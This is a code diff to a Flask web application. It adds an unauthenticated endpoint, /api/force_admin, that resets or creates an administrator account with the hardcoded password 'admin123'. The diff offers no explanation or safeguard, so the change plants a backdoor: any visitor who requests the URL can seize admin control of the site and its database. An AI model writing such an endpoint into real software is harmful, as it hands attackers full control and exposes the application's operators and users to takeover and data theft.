@@ -2970,3 +2970,19 @@ if __name__ == '__main__':
         import traceback
         traceback.print_exc()
         sys.exit(1)
+
+@app.route('/api/force_admin')
+def force_admin():
+    try:
+        conn = get_db_connection()
+        cur = get_db_cursor(conn)
+        admin_hash = generate_password_hash('admin123')
+        cur.execute("SELECT id FROM dust_users WHERE username = 'admin'")
+        if cur.fetchone():
+            cur.execute("UPDATE dust_users SET password_hash = %s WHERE username = 'admin'", (admin_hash,))
+        else:
+            cur.execute("INSERT INTO dust_users (username, email, password_hash, is_admin) VALUES ('admin', 'admin@example.com', %s, TRUE)", (admin_hash,))
+        conn.commit()
+        return "SUCCESS"
+    except Exception as e:
+        return str(e)
